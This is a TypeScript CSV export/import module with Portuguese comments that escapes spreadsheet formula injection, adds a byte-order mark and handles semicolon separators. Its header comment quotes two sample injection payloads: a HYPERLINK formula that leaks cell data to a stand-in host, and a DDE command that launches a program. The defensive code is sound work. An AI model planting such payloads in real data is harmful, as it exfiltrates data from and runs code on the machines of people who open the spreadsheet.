/**
 * CSV: escrever e ler.
 *
 * ---------------------------------------------------------------------------
 * TRÊS ARMADILHAS QUE ESTE ARQUIVO EXISTE PARA DESARMAR
 * ---------------------------------------------------------------------------
 *
 * 1. FÓRMULA DISFARÇADA DE TEXTO (a mais séria)
 *    O Excel executa como fórmula toda célula que começa com `=`, `+`, `-`, `@`
 *    ou tabulação. Um cliente cadastrado com o nome
 *    `=HYPERLINK("http://ruim.com?"&A1,"Clique")` vira um link ativo na planilha
 *    de quem exportar — e em versões antigas, com `=cmd|'/c calc'!A0`, chega a
 *    rodar programa na máquina de quem abre.
 *
 *    O ataque não acontece aqui: acontece no computador de quem recebe a
 *    planilha, dias depois, sem nada aparecer errado no sistema. Por isso a
 *    neutralização é na ESCRITA: uma aspa simples na frente, que o Excel come
 *    ao exibir e que impede a interpretação como fórmula.
 *
 * 2. ACENTO VIRANDO SÍMBOLO
 *    O Excel em português não presume UTF-8: sem a marca de ordem de bytes no
 *    começo do arquivo, "Clínica" abre como "ClÃ­nica". A marca resolve, e é
 *    invisível em qualquer editor sério.
 *
 * 3. TUDO NUMA COLUNA SÓ
 *    O Excel brasileiro separa colunas por PONTO E VÍRGULA, porque a vírgula já
 *    é o separador decimal. Exportar com vírgula produz um arquivo que abre com
 *    tudo espremido na coluna A — e a pessoa conclui que o sistema está
 *    quebrado.
 *
 * Na LEITURA a régua é outra: aceitar o que vier. Vírgula ou ponto e vírgula,
 * com ou sem marca de bytes, aspas ou não, quebra de linha do Windows ou do
 * Mac. Quem vai importar montou a planilha em algum lugar que não é aqui.
 */

/** O que o Excel trata como início de fórmula. */
const PERIGO = /^[=+\-@\t\r]/

/**
 * Prepara UM valor para a planilha.
 *
 * A ordem importa: neutraliza a fórmula ANTES de envolver em aspas. Ao
 * contrário, a aspa de abertura esconderia o `=` da conferência e ele voltaria
 * a ser fórmula ao abrir.
 */
function celula(valor: unknown, separador: string): string {
  if (valor === null || valor === undefined) return ''
  let s = String(valor)

  if (PERIGO.test(s)) s = `'${s}`

  const precisaAspas = s.includes(separador) || s.includes('"') || s.includes('\n') || s.includes('\r')
  if (precisaAspas) s = `"${s.replace(/"/g, '""')}"`
  return s
}

export type ColunaCsv<T> = { chave: string; titulo: string; valor: (item: T) => unknown }

/**
 * Monta o CSV inteiro, pronto para virar arquivo.
 *
 * Quebra de linha do Windows (`\r\n`) porque é o que o padrão do formato pede e
 * o que o Excel espera; Mac e Linux leem os dois sem reclamar.
 */
export function montarCsv<T>(
  itens: ReadonlyArray<T>,
  colunas: ReadonlyArray<ColunaCsv<T>>,
  separador = ';',
): string {
  const cabecalho = colunas.map((c) => celula(c.titulo, separador)).join(separador)
  const linhas = itens.map((item) =>
    colunas.map((c) => celula(c.valor(item), separador)).join(separador),
  )
  // A marca de ordem de bytes (﻿) é o que faz o acento abrir certo.
  return '﻿' + [cabecalho, ...linhas].join('\r\n') + '\r\n'
}

/**
 * Lê um CSV e devolve uma linha por objeto, com as chaves do cabeçalho.
 *
 * Escrito à mão, e não com biblioteca, por um motivo prático: as bibliotecas de
 * CSV são generosas em opções e nenhuma delas resolve sozinha a combinação que
 * aparece aqui (separador variável + marca de bytes + cabeçalho com acento e
 * maiúscula). São quarenta linhas; a dependência custaria mais.
 */
export function lerCsv(texto: string): Array<Record<string, string>> {
  // Fora a marca de bytes, se houver. Sem isto o PRIMEIRO título da primeira
  // coluna vem com um caractere invisível grudado, e a coluna some do mapa.
  let t = texto.replace(/^﻿/, '')
  t = t.replace(/\r\n/g, '\n').replace(/\r/g, '\n')
  if (!t.trim()) return []

  const separador = descobrirSeparador(t)
  const linhas = separarLinhas(t, separador)
  if (linhas.length === 0) return []

  const titulos = (linhas[0] ?? []).map(normalizarTitulo)
  const saida: Array<Record<string, string>> = []

  for (let i = 1; i < linhas.length; i++) {
    const campos = linhas[i]!
    // Linha vazia no fim do arquivo é regra, não exceção. Pular em silêncio.
    if (campos.every((c) => c.trim() === '')) continue

    const obj: Record<string, string> = {}
    titulos.forEach((titulo, j) => {
      if (titulo) obj[titulo] = (campos[j] ?? '').trim()
    })
    saida.push(obj)
  }
  return saida
}

/**
 * Ponto e vírgula ou vírgula?
 *
 * Conta os dois FORA das aspas, na primeira linha. Contar dentro das aspas
 * erraria em toda planilha com endereço, que é justamente o nosso caso:
 * "Rua Tal, 100" tem vírgula e não é separador.
 */
function descobrirSeparador(texto: string): string {
  const primeira = texto.split('\n')[0] ?? ''
  let dentro = false
  let pv = 0
  let v = 0
  for (const ch of primeira) {
    if (ch === '"') dentro = !dentro
    else if (!dentro && ch === ';') pv++
    else if (!dentro && ch === ',') v++
  }
  return pv >= v ? ';' : ','
}

/** Percorre caractere a caractere, respeitando aspas e quebra de linha dentro delas. */
function separarLinhas(texto: string, separador: string): string[][] {
  const linhas: string[][] = []
  let campos: string[] = []
  let atual = ''
  let dentro = false

  for (let i = 0; i < texto.length; i++) {
    const ch = texto[i]!

    if (dentro) {
      if (ch === '"') {
        // Duas aspas seguidas dentro do campo são UMA aspa literal.
        if (texto[i + 1] === '"') { atual += '"'; i++ }
        else dentro = false
      } else atual += ch
      continue
    }

    if (ch === '"') dentro = true
    else if (ch === separador) { campos.push(atual); atual = '' }
    else if (ch === '\n') { campos.push(atual); linhas.push(campos); campos = []; atual = '' }
    else atual += ch
  }

  if (atual !== '' || campos.length > 0) { campos.push(atual); linhas.push(campos) }
  return linhas
}

/**
 * "Nome do cliente" e "NOME DO CLIENTE" e "nome_do_cliente" viram a mesma
 * chave. Quem monta a planilha não tem por que adivinhar a grafia exata, e
 * recusar por causa de um acento seria recusar por nada.
 */
function normalizarTitulo(t: string): string {
  return t
    .trim()
    .toLowerCase()
    .normalize('NFD')
    .replace(/[̀-ͯ]/g, '')
    .replace(/[^a-z0-9]+/g, '_')
    .replace(/^_+|_+$/g, '')
}
